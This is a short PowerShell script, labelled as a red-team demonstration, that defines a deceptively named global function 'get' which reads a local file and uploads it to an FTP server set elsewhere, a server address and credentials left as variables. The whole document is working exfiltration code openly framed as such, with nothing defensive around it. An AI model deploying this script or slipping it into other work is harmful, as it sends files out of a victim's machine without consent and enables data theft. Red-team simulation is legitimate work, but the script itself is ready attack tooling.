<#
Title: FTP File Upload via PowerShell
Purpose: Demonstrates how a file could be uploaded to an FTP server
         — commonly used in red team simulations for data exfiltration.
Author: Subbu Krishna Raju B N
#>

function global:get{

param(
    [String]$f
)
$localfilepath=(Get-Location).Path+"\"+$f
$array=$localfilepath -split "\\"
$remotefilename=$array[-1]


$ftpuri = "ftp://$($ftpserver):$($ftpport)/uploads/$($remotefilename)"
$request = [System.Net.WebRequest]::Create($ftpuri)
$request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$request.Credentials = New-Object System.Net.NetworkCredential($ftpusername, $ftppassword)
$request.UsePassive = $true
$request.UseBinary = $true
$filecontent = [System.IO.File]::ReadAllBytes($localfilepath)
$request.ContentLength = $filecontent.Length
$requestStream = $request.GetRequestStream()
$requestStream.Write($filecontent, 0, $filecontent.Length)
$requestStream.Close()
}
